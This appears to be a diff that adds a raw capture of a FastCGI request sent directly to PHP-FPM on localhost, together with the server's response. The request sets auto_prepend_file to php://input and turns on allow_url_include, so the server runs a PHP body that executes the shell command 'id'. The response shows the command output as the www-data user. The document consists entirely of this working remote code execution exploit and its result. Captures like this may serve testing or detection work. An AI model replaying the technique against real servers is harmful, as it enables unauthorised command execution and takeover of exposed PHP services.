@@ -1,0 +1,27 @@
+...>...............>......
+CONTENT_LENGTH25..
+CONTENT_TYPEapplication/text..
+REMOTE_PORT9985.	
+SERVER_NAMElocalhost..
+GATEWAY_INTERFACEFastCGI/1.0..
+SERVER_SOFTWAREphp/fcgiclient.	
+REMOTE_ADDR127.0.0.1..
+SCRIPT_FILENAME/usr/local/lib/php/System.php..
+SCRIPT_NAME/usr/local/lib/php/System.php	.
+PHP_VALUEauto_prepend_file = php://input..
+REQUEST_METHODPOST..
+SERVER_PORT80..
+SERVER_PROTOCOLHTTP/1.1..
+QUERY_STRING..
+PHP_ADMIN_VALUEallow_url_include = On
+.DOCUMENT_ROOT/.	
+SERVER_ADDR127.0.0.1..
+REQUEST_URI/usr/local/lib/php/System.php
+...>.......>....<?php echo `id`; exit; ?>...>....
+
+...>.y..
+X-Powered-By: PHP/7.1.4
+Content-type: text/html; charset=UTF-8
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+..........>.........ole
